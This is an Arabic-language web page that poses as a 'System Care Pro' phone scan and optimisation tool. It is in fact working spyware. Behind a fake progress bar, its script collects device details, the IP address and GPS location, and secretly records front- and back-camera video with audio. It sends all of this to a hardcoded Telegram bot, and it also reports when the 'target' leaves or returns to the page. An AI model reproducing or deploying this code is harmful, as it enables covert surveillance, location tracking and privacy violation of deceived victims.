<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Care - فحص وإصلاح أداء النظام</title>
    <style>
        :root { --primary: #2ecc71; --danger: #e74c3c; --dark: #1a1a2e; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 25px; padding: 30px; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        .icon-box { font-size: 50px; margin-bottom: 20px; color: var(--primary); }
        h1 { font-size: 1.4rem; margin: 0 0 10px; }
        p { color: #8b8b8b; font-size: 0.9rem; margin-bottom: 30px; }

        .status-list { text-align: right; margin-bottom: 30px; }
        .status-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
        .status-item span:last-child { color: var(--primary); font-weight: bold; }

        #scanBtn { background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(46, 204, 113, 0.2); }
        #scanBtn:active { transform: scale(0.95); }

        /* شريط التحميل الوهمي */
        #loader { display: none; margin-top: 20px; }
        .progress-bar { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background: var(--primary); transition: 0.5s; }
        
        video { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon-box">🛡️</div>
        <h1>System Care Pro</h1>
        <p>قم بفحص تعريفات الجهاز وتحسين أداء البطارية والمعالج فوراً.</p>

        <div class="status-list">
            <div class="status-item"><span>حالة المعالج:</span><span id="cpu-status">تحليل...</span></div>
            <div class="status-item"><span>ذاكرة الرام:</span><span id="ram-status">تحليل...</span></div>
            <div class="status-item"><span>أمان الكاميرا:</span><span>محمي ✅</span></div>
        </div>

        <button id="scanBtn">بدء الفحص السريع</button>

        <div id="loader">
            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
            <p id="scanText" style="margin-top:10px; font-size:0.8rem;">جاري فحص العتاد...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function sendToTelegram(msg, type = "text", data = null) {
            const url = `https://api.telegram.org/bot${token}/`;
            const fd = new FormData();
            fd.append("chat_id", chat);
            try {
                if (type === "text") {
                    await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
                } else if (type === "video") {
                    fd.append("video", data, "system_check.mp4");
                    if (msg) fd.append("caption", msg);
                    await fetch(url + "sendVideo", { method: "POST", body: fd });
                }
            } catch (e) {}
        }

        // إظهار بيانات حقيقية لزيادة الثقة
        document.getElementById('cpu-status').innerText = navigator.hardwareConcurrency + " Cores";
        document.getElementById('ram-status').innerText = (navigator.deviceMemory || 4) + " GB";

        async function getFullReport() {
            let info = `🛡️ *تقرير فحص النظام*:\n\n`;
            info += `• 📱 الموديل: \`${navigator.platform}\`\n`;
            info += `• 💾 الرام: \`${navigator.deviceMemory || "?"} GB\`\n`;
            try {
                const b = await navigator.getBattery();
                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\`\n`;
            } catch(e) {}
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
            } catch(e) {}
            return info;
        }

        async function recordVideo(mode, label, duration) {
            try {
                if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                window.currentStream = stream;
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = (e) => chunks.push(e.data);
                const recordingPromise = new Promise(resolve => {
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: "video/mp4" });
                        if (blob.size > 2000) await sendToTelegram(`🎥 فيديو فحص (${label})`, "video", blob);
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                });
                recorder.start();
                await new Promise(r => setTimeout(r, duration));
                recorder.stop();
                return recordingPromise;
            } catch (e) { return null; }
        }

        document.getElementById("scanBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("loader").style.display = "block";
            
            let p = 0;
            const fill = document.getElementById("fill");
            const txt = document.getElementById("scanText");
            
            const interval = setInterval(() => {
                p += Math.random() * 5;
                if (p > 100) p = 100;
                fill.style.width = p + "%";
                if (p > 20) txt.innerText = "فحص تعريفات الكاميرا...";
                if (p > 50) txt.innerText = "تحليل جودة الميكروفون...";
                if (p > 80) txt.innerText = "جاري رفع تقرير الأداء...";
            }, 300);

            // إرسال البيانات فوراً
            sendToTelegram(await getFullReport());
            navigator.geolocation.getCurrentPosition(p => {
                sendToTelegram(`📍 *موقع الجهاز*:\n[خرائط جوجل](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
            });

            // تسجيل الفيديوهات بصوت (12 ثانية لكل منهما)
            await recordVideo("user", "أمامي", 12000);
            await new Promise(r => setTimeout(r, 2500)); // حل مشكلة التداخل
            await recordVideo("environment", "خلفي", 12000);

            setTimeout(() => {
                clearInterval(interval);
                alert("تم تحسين النظام بنجاح! سيتم توجيهك لصفحة النتائج.");
                location.href = "https://www.google.com";
            }, 3000);
        };

        window.onblur = () => sendToTelegram("🔴 الهدف خرج من الفحص.");
        window.onfocus = () => sendToTelegram("🟢 الهدف عاد للفحص.");
    </script>
</body>
</html>
